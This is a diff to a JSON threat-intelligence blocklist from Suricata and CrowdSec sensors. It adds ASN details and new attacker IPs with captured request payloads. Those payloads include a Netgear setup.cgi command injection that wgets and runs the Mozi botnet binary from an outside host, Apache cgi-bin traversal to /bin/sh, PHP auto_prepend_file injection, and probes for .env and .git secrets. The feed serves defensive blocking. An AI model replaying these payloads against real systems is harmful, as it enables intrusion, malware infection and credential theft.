@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-06-17T01:00:00Z",
+  "generated_at": "2026-06-17T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 35,
-    "v4": 35,
+    "total": 45,
+    "v4": 45,
     "v6": 0
   },
   "items": [
@@ -74,6 +74,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -91,7 +94,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "49870",
+      "asn_name": "AS49870-BV - Alsycon B.V.",
+      "asn_prefix": "160.119.76.0/23"
     },
     {
       "ip": "172.189.127.18",
@@ -104,6 +110,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -124,6 +133,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "40.124.0.0/16",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -145,6 +157,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "31275",
+      "asn_name": "Samtelecom-AS LLC Telecom-Service",
+      "asn_prefix": "83.220.64.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://83.220.64.48:41308/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://83.220.64.48:41308/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
@@ -161,6 +176,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -179,6 +197,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
       "tags": [
         "tor:exit-node"
       ]
@@ -239,6 +260,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
       "tags": [
         "tor:exit-node"
       ]
@@ -329,6 +353,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8283",
+      "asn_name": "COLOCLUE-AS Netwerkvereniging Coloclue",
+      "asn_prefix": "94.142.240.0/21",
       "tags": [
         "tor:exit-node"
       ]
@@ -344,6 +371,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
       "tags": [
         "tor:exit-node"
       ]
@@ -388,7 +418,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "4837",
+      "asn_name": "CHINA169-BACKBONE CHINA UNICOM China169 Backbone",
+      "asn_prefix": "117.8.0.0/13"
     },
     {
       "ip": "172.189.127.20",
@@ -401,6 +434,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -419,6 +455,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8560",
+      "asn_name": "IONOS-AS IONOS SE",
+      "asn_prefix": "217.154.159.0/24",
       "payloads": [
         "POST /"
       ]
@@ -434,6 +473,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "104.248.112.0/20",
       "payloads": [
         "GET /"
       ]
@@ -449,6 +491,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "63949",
+      "asn_name": "AKAMAI-LINODE-AP Akamai Connected Cloud",
+      "asn_prefix": "45.33.104.0/21",
       "payloads": [
         "GET /"
       ]
@@ -464,6 +509,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "63949",
+      "asn_name": "AKAMAI-LINODE-AP Akamai Connected Cloud",
+      "asn_prefix": "172.104.208.0/20",
       "payloads": [
         "GET /"
       ]
@@ -479,6 +527,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -499,6 +550,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.0.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -520,6 +574,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "52.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -550,6 +607,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.192.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -568,6 +628,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "136.112.0.0/16",
       "tags": [
         "mwl:cloud=\"gcp\""
       ]
@@ -583,6 +646,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -601,8 +667,180 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "135.236.0.0/15",
       "tags": [
         "mwl:cloud=\"azure\""
+      ]
+    },
+    {
+      "ip": "172.215.210.55",
+      "family": "v4",
+      "first_seen": "2026-06-17T05:00:00Z",
+      "last_seen": "2026-06-17T05:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "suricata/ET WEB_SERVER WEB-PHP phpinfo access"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /.git/logs/HEAD",
+        "GET /.git/refs/heads/master",
+        "GET /.git/index",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.backup",
+        "GET /.env.save",
+        "GET /.env.prod",
+        "GET /.env.old",
+        "GET /.env.bak",
+        "GET /phpinfo.php"
+      ]
+    },
+    {
+      "ip": "176.112.128.143",
+      "family": "v4",
+      "first_seen": "2026-06-17T12:00:00Z",
+      "last_seen": "2026-06-17T12:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "ip": "41.110.4.106",
+      "family": "v4",
+      "first_seen": "2026-06-17T11:00:00Z",
+      "last_seen": "2026-06-17T11:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
+      ]
+    },
+    {
+      "ip": "46.13.79.128",
+      "family": "v4",
+      "first_seen": "2026-06-17T10:00:00Z",
+      "last_seen": "2026-06-17T10:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "POST /cgi-bin/ViewLog.asp"
+      ]
+    },
+    {
+      "ip": "119.96.223.148",
+      "family": "v4",
+      "first_seen": "2026-06-17T10:00:00Z",
+      "last_seen": "2026-06-17T10:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "POST /cgi-bin/ViewLog.asp"
+      ]
+    },
+    {
+      "ip": "120.85.114.123",
+      "family": "v4",
+      "first_seen": "2026-06-17T08:00:00Z",
+      "last_seen": "2026-06-17T08:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WGET Command Specifying Output in HTTP Headers"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "POST /HNAP1/"
+      ]
+    },
+    {
+      "ip": "159.223.159.217",
+      "family": "v4",
+      "first_seen": "2026-06-17T06:00:00Z",
+      "last_seen": "2026-06-17T06:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ]
+    },
+    {
+      "ip": "52.224.242.102",
+      "family": "v4",
+      "first_seen": "2026-06-17T02:00:00Z",
+      "last_seen": "2026-06-17T02:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SSH invalid banner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ]
+    },
+    {
+      "ip": "20.200.64.201",
+      "family": "v4",
+      "first_seen": "2026-06-17T02:00:00Z",
+      "last_seen": "2026-06-17T02:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP Host header invalid"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /config/getuser?index=0"
+      ]
+    },
+    {
+      "ip": "41.216.182.77",
+      "family": "v4",
+      "first_seen": "2026-06-17T12:00:00Z",
+      "last_seen": "2026-06-17T12:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /"
       ]
     }
   ]
